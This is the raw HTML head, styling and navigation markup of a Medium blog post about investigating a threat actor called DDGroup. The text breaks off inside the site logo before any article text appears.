<!doctype html><html lang="en"><head><title data-rh="true">Uncovering DDGroup — A long-time threat actor | by Gi7w0rm | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2023-09-08T05:36:27.927Z"/><meta data-rh="true" name="title" content="Uncovering DDGroup — A long-time threat actor | by Gi7w0rm | Medium"/><meta data-rh="true" property="og:title" content="Uncovering DDGroup — A long-time threat actor"/><meta data-rh="true" property="al:android:url" content="medium://p/d3b3020625a4"/><meta data-rh="true" property="al:ios:url" content="medium://p/d3b3020625a4"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems noteworthy, or something that just sticks with you. This blog…"/><meta data-rh="true" property="og:description" content="Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems…"/><meta data-rh="true" property="og:url" content="https://gi7w0rm.medium.com/uncovering-ddgroup-a-long-time-threat-actor-d3b3020625a4"/><meta data-rh="true" property="al:web:url" content="https://gi7w0rm.medium.com/uncovering-ddgroup-a-long-time-threat-actor-d3b3020625a4"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1063/1*GFtbwtoJ3STVtn-smfpLsg.png"/><meta data-rh="true" property="article:author" content="https://gi7w0rm.medium.com"/><meta data-rh="true" name="author" content="Gi7w0rm"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Uncovering DDGroup — A long-time threat actor"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/d3b3020625a4"/><meta data-rh="true" property="twitter:description" content="Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems…"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1063/1*GFtbwtoJ3STVtn-smfpLsg.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@Gi7w0rm"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="16 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://gi7w0rm.medium.com"/><link data-rh="true" rel="canonical" href="https://gi7w0rm.medium.com/uncovering-ddgroup-a-long-time-threat-actor-d3b3020625a4"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/d3b3020625a4"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*GFtbwtoJ3STVtn-smfpLsg.png"],"url":"https:\u002F\u002Fgi7w0rm.medium.com\u002Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4","dateCreated":"2023-09-08T05:36:27.927Z","datePublished":"2023-09-08T05:36:27.927Z","dateModified":"2024-03-19T19:23:45.088Z","headline":"Uncovering DDGroup — A long-time threat actor - Gi7w0rm - Medium","name":"Uncovering DDGroup — A long-time threat actor - Gi7w0rm - Medium","description":"Sometimes when investigating malware, you come across something that calls your attention. Something that seems odd, something that seems noteworthy, or something that just sticks with you. This blog…","identifier":"d3b3020625a4","author":{"@type":"Person","name":"Gi7w0rm","url":"https:\u002F\u002Fgi7w0rm.medium.com"},"creator":["Gi7w0rm"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fgi7w0rm.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fgi7w0rm.medium.com\u002Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4"}</script><style type="text/css" data-fela-rehydration="556" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="556" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{opacity:1}.lb{padding:4px 0}.le{margin-top:0px}.lf{width:16px}.lh{display:inline-flex}.ln{max-width:100%}.lo{padding:8px 2px}.lp svg{color:#6B6B6B}.mg{line-height:1.58}.mh{letter-spacing:-0.004em}.mi{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nd{margin-bottom:-0.46em}.ne{margin-top:32px}.nf{margin-bottom:14px}.ng{padding-top:24px}.nh{padding-bottom:10px}.ni{background-color:#000000}.nj{height:3px}.nk{width:3px}.nl{margin-right:20px}.nm{line-height:1.18}.nn{letter-spacing:-0.022em}.no{font-weight:600}.oe{margin-bottom:-0.31em}.ok{text-decoration:underline}.oq{overflow-x:auto}.or{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.os{padding:32px}.ot{border:1px solid #E5E5E5}.ou{line-height:1.4}.ov{margin-top:-0.2em}.ow{margin-bottom:-0.2em}.ox{white-space:pre}.oy{min-width:fit-content}.oz{list-style-type:decimal}.pa{margin-left:30px}.pb{padding-left:0px}.ph{margin-left:auto}.pi{margin-right:auto}.pj{max-width:1305px}.pk{clear:both}.pm{cursor:zoom-in}.pn{z-index:auto}.pp{height:auto}.pq{margin-top:10px}.pr{max-width:728px}.pu{max-width:1920px}.pv{max-width:1063px}.pw{max-width:1755px}.px{margin:auto}.py{overflow:hidden}.pz{padding-bottom:56.199999999999996%}.qa{height:0}.qb{list-style-type:disc}.qc{max-width:1711px}.qd{max-width:1138px}.qe{max-width:1707px}.qk{max-width:2489px}.ql{padding-top:5px}.qm{padding-bottom:5px}.qn{box-shadow:inset 3px 0 0 0 #242424}.qo{padding-left:23px}.qp{margin-left:-20px}.qq{font-style:italic}.qr{max-width:2173px}.qs{max-width:1090px}.qt{max-width:2261px}.qu{max-width:2283px}.qv{max-width:2252px}.qw{max-width:2199px}.qx{max-width:2235px}.rd{box-shadow:inset 0 0 0 1px #F2F2F2}.re{padding:0px}.rf{padding:16px 20px}.rg{flex:1 1 auto}.ri{max-height:40px}.rj{text-overflow:ellipsis}.rk{display:-webkit-box}.rl{-webkit-line-clamp:2}.rm{-webkit-box-orient:vertical}.ro{margin-top:8px}.rp{margin-top:12px}.rq{width:160px}.rr{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*ggCEsWLF-G-TAz4P)}.rs{background-origin:border-box}.rt{background-size:cover}.ru{height:167px}.rv{background-position:50% 50%}.rw{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*0S3ILLNj6lIKjsXF)}.rx{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*dF5UkLaSH8l44dQt)}.ry{margin-bottom:26px}.rz{margin-top:6px}.sa{margin-right:8px}.sb{padding:8px 16px}.sc{border-radius:100px}.sd{transition:background 300ms ease}.sf{white-space:nowrap}.sg{border-top:none}.sm{height:52px}.sn{max-height:52px}.so{box-sizing:content-box}.sp{position:static}.sq{z-index:1}.ss{max-width:155px}.td{align-items:flex-end}.te{width:76px}.tf{height:76px}.tg{border:2px solid #F9F9F9}.th{height:72px}.ti{width:72px}.tj{stroke:#F2F2F2}.tk{height:36px}.tl{width:36px}.tm{color:#F2F2F2}.tn{fill:#F2F2F2}.to{background:#F2F2F2}.tp{border-color:#F2F2F2}.tv{font-weight:500}.tw{font-size:24px}.tx{line-height:30px}.ty{letter-spacing:-0.016em}.tz{margin-top:16px}.ua{height:0px}.ub{border-bottom:solid 1px #E5E5E5}.uh{margin-top:72px}.ui{padding:24px 0}.uj{margin-bottom:0px}.uk{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.lc:hover{fill:#000000}.ld:hover p{color:#000000}.lg:hover{color:#000000}.lq:hover svg{color:#000000}.se:hover{background-color:#F2F2F2}.tq:hover{background:#F2F2F2}.tr:hover{border-color:#F2F2F2}.ts:hover{cursor:wait}.tt:hover{color:#F2F2F2}.tu:hover{fill:#F2F2F2}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.lr:focus svg{color:#000000}.po:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.lm{margin:0}.mz{font-size:20px}.na{margin-top:2.14em}.nb{line-height:32px}.nc{letter-spacing:-0.003em}.ob{margin-top:1.72em}.oc{line-height:24px}.od{letter-spacing:0}.oj{margin-top:0.94em}.op{margin-top:56px}.pg{margin-top:1.14em}.qj{max-width:1192px}.rc{margin-top:32px}.sl{margin-bottom:88px}.sx{display:inline-block}.tc{padding-top:72px}.ug{margin-top:40px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.ps{margin-left:auto}.pt{text-align:center}.sw{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.sv{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.rh{padding:10px 12px 10px}.su{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:4px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.li{margin:0}.ls{border:1px solid #F2F2F2}.lt{border-radius:99em}.lu{padding:0px 16px 0px 12px}.lv{height:38px}.lw{align-items:center}.ly svg{margin-right:8px}.mj{font-size:18px}.mk{margin-top:1.56em}.ml{line-height:28px}.mm{letter-spacing:-0.003em}.np{font-size:16px}.nq{margin-top:1.23em}.nr{letter-spacing:0}.of{margin-top:0.67em}.ol{margin-top:40px}.pc{margin-top:1.34em}.qf{max-width:100%}.qy{margin-top:24px}.sh{margin-bottom:80px}.st{display:inline-block}.sy{padding-top:48px}.uc{margin-top:32px}.lx:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:68px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.ll{margin:0}.mv{font-size:20px}.mw{margin-top:2.14em}.mx{line-height:32px}.my{letter-spacing:-0.003em}.ny{margin-top:1.72em}.nz{line-height:24px}.oa{letter-spacing:0}.oi{margin-top:0.94em}.oo{margin-top:56px}.pf{margin-top:1.14em}.qi{max-width:1192px}.rb{margin-top:32px}.sk{margin-bottom:88px}.tb{padding-top:72px}.uf{margin-top:40px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:68px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.lk{margin:0}.mr{font-size:20px}.ms{margin-top:2.14em}.mt{line-height:32px}.mu{letter-spacing:-0.003em}.nv{margin-top:1.72em}.nw{line-height:24px}.nx{letter-spacing:0}.oh{margin-top:0.94em}.on{margin-top:56px}.pe{margin-top:1.14em}.qh{max-width:100%}.ra{margin-top:32px}.sj{margin-bottom:88px}.ta{padding-top:72px}.ue{margin-top:40px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.lj{margin:0}.lz{border:1px solid #F2F2F2}.ma{border-radius:99em}.mb{padding:0px 16px 0px 12px}.mc{height:38px}.md{align-items:center}.mf svg{margin-right:8px}.mn{font-size:18px}.mo{margin-top:1.56em}.mp{line-height:28px}.mq{letter-spacing:-0.003em}.ns{font-size:16px}.nt{margin-top:1.23em}.nu{letter-spacing:0}.og{margin-top:0.67em}.om{margin-top:40px}.pd{margin-top:1.34em}.qg{max-width:100%}.qz{margin-top:24px}.si{margin-bottom:80px}.sz{padding-top:48px}.ud{margin-top:32px}.me:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="print">.sr{display:none}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.pl{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.rn{max-height:none}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd3b3020625a4&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Funcovering-ddgroup-a-long-time-threat-actor-d3b3020625a4&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 